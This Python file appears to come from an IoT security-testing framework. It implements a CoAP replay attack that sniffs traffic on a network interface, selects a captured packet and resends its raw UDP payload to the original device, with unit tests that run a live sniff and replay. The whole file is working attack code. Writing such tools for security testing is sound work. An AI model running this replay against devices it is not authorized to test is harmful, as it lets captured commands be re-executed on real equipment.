import logging
import signal
import socket
import time
import unittest

from Entity.attack import Attack
from Entity.input_format import InputFormat
from Utils.SnifferUtil import generic_sniffer
from protocols.CoAP.coap_scanner import CoAPScanner


class CoAPReplayAttack(Attack):
    """
    CoAP Protocol - Replay Attack module
    It is created to scan/sniff the valid traffic of target protocol and send the selected packets to the target device
    """
    captured_packets = None

    # Input Fields
    selected_index = 0
    timeout = generic_sniffer.DEFAULT_SNIFF_TIMEOUT
    interface = generic_sniffer.DEFAULT_INTERFACE

    # Miscellaneous Members
    logger = None

    def __init__(self):
        default_parameters = ["", 10, "any"]
        inputs = [
            InputFormat("Selected packet index", "selected_index", self.selected_index, int, mandatory=True),
            InputFormat("Timeout", "timeout", self.timeout, float),
            InputFormat("Interface", "interface", str(self.interface), str, mandatory=True)
        ]

        Attack.__init__(self, "CoAP Replay Attack", inputs, default_parameters,
                        "    It listens to the network traffic and\n"
                        "    sends captured packets without changing anything.")

        logging.basicConfig(level=logging.DEBUG, format="%(asctime)s:%(levelname)s:%(name)s:%(message)s")

        # Signal handler to exit from function
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, sig, frame):
        self.stop_attack()

    def stop_attack(self):
        self.logger.info("Exitting...")
        time.sleep(2)  # Sleep two seconds so the user can see the message

    def pre_attack_init(self):
        try:
            assert self.selected_index >= 0
        except AssertionError as e:
            self.logger.error("Invalid input value!")
            raise

    def run(self):
        super(CoAPReplayAttack, self).run()
        self.pre_attack_process()  # Sniff the packets so we can replay
        self.pre_attack_init()  # Do the necessary checks
        try:
            selected_packet = self.captured_packets[self.selected_index]
            self.logger.info(selected_packet)
            udp_payload = CoAPScanner.get_raw_udp_payload_as_bytes(selected_packet)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(udp_payload, (str(selected_packet["ip"].dst), int(selected_packet["udp"].dstport)))
        except IndexError as e:
            self.logger.error("Invalid packet index. Indices start from 0...")

    def pre_attack_process(self):
        """
        TODO Need to think how we can integrate such a pre_called method to GUI before attack execution
        Scans valid packets to be replayed
        """
        super(CoAPReplayAttack, self).set_input_value("timeout")
        try:
            assert self.timeout >= 0
            self.captured_packets = CoAPScanner().scan(self.timeout, self.interface, True)
        except AssertionError as e:
            self.logger.error("Invalid timeout for scan operation!")


class TestCoAPReplayAttack(unittest.TestCase):
    def setUp(self):
        self.coap_replay_attack = CoAPReplayAttack()

    def tearDown(self):
        pass

    def test_name(self):
        self.assertEqual("CoAP Replay Attack", self.coap_replay_attack.get_attack_name())

    def test_non_initialized_inputs(self):
        inputs = self.coap_replay_attack.get_inputs()
        for _input in inputs:
            value = getattr(self.coap_replay_attack, _input.get_name())
            self.assertTrue(value is None or type(value) == _input.get_type())

    def test_after_getting_inputs(self):
        example_inputs = [8, 13.2, "test-interface"]
        for index, _input in enumerate(example_inputs):
            self.coap_replay_attack.inputs[index].set_value(_input)

        super(CoAPReplayAttack, self.coap_replay_attack).run()

        inputs = self.coap_replay_attack.get_inputs()
        for index, _input in enumerate(inputs):
            value = getattr(self.coap_replay_attack, _input.get_name())
            self.assertEqual(example_inputs[index], value)

    def test_replay_attack(self):
        example_inputs = [0, 15., "any"]
        for index, _input in enumerate(example_inputs):
            self.coap_replay_attack.inputs[index].set_value(_input)

        self.coap_replay_attack.pre_attack_process()
        packets = self.coap_replay_attack.captured_packets

        self.assertIsNotNone(packets)
        self.assertTrue(type(packets) == list)
        self.assertGreaterEqual(len(packets), 0)

        if len(packets) > 0:
            self.coap_replay_attack.run()
            self.assertTrue(True)
        else:
            self.assertTrue(False)


if __name__ == '__main__':
    unittest.main()
